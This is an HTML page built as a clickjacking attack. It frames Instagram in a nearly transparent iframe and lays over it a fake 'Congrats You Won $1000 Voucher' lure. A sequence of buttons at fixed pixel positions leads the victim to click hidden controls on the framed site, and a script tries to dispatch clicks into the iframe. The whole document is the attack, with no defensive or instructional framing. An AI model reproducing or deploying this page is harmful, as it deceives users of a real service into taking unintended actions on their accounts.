<!DOCTYPE html>
<html>
<head>
	<title>Copy Voucher Code to Clipboard</title>
	<style>
		#iframeContainer {
			position: relative;
			width: 100%;
			height: 650px;
			opacity: 0.2;
		}

		.buttonContainer {
			position: absolute;
			top: 20px;
			left: 20px;
			text-align: left;
			z-index: 2;
		}

		.buttonContainer button {
			display: none;
			margin: 10px;
		}

		.firstClick {
			position: absolute;
			left: 1446px;
			top: 533px;
		}

		.secondClick {
			position: absolute;
			left: 595px;
			top: 510px;
		}

		.thirdClick {
			position: absolute;
			left: 41px;
			top: 478px;
		}

		.fourthClick {
			position: absolute;
			left: 1088px;
			top: 6px;
		}

		.fifthClick {
			position: absolute;
			left: 712px;
			top: 279px;
		}

		.sixthClick {
			position: absolute;
			left: 669px;
			top: 167px;
		}

		.sevenClick {
			position: absolute;
			left: 712px;
			top: 379px;
		}

		h1 {
			position: absolute;
			left: 374px;
			top: 143px;
			display: inline-block;
		}
	</style>
	<script>
		window.onload = function() {
			const iframe = document.querySelector('iframe');
			const buttonContainer = document.querySelector('.buttonContainer');
			const buttons = buttonContainer.getElementsByTagName('button');
			let currentButtonIndex = 0;

			buttons[currentButtonIndex].style.display = 'block';

			buttonContainer.addEventListener('click', function(event) {
				if (event.target.tagName === 'BUTTON') {
					buttons[currentButtonIndex].style.display = 'none';
					currentButtonIndex++;

					if (currentButtonIndex < buttons.length) {
						buttons[currentButtonIndex].style.display = 'block';
					}

					const iframeButton = iframe.contentWindow.document.querySelector('.iframe-button');
					const iframeButtonRect = iframeButton.getBoundingClientRect();
					const iframeButtonCenterX = iframeButtonRect.left + (iframeButtonRect.width / 2);
					const iframeButtonCenterY = iframeButtonRect.top + (iframeButtonRect.height / 2);
					
					const clickEvent = new MouseEvent('click', {
						clientX: iframeButtonCenterX,
						clientY: iframeButtonCenterY
					});
					iframe.contentWindow.document.elementFromPoint(iframeButtonCenterX, iframeButtonCenterY).dispatchEvent(clickEvent);
				}
			});

			iframe.contentWindow.document.addEventListener('click', function() {
				showNextButton();
			});

			function showNextButton() {
				buttons[currentButtonIndex].style.display = 'block';
			}
		};
	</script>
</head>
<body>
	<div id="iframeContainer">
		<iframe src="https://instagram.com" width="100%" height="100%"></iframe>
	</div>

	<div class="buttonContainer">
		<h1>Congrats You Won $1000 Voucher Follow the steps & claim your voucher</h1>
		<button class="firstClick">Click Here 1</button>
		<button class="secondClick" style="display: none;">Visit Here</button>
		<button class="thirdClick" style="display: none;">Click Here 2</button>
		<button class="fourthClick" style="display: none;">Click Here 3</button>
		<button class="fifthClick" style="display: none;">Click Here 4</button>
		<button class="sixthClick" style="display: none;">Click Here 5</button>
		<button class="sevenClick" style="display: none;">Claim Now</button>
	</div>
</body>
</html>
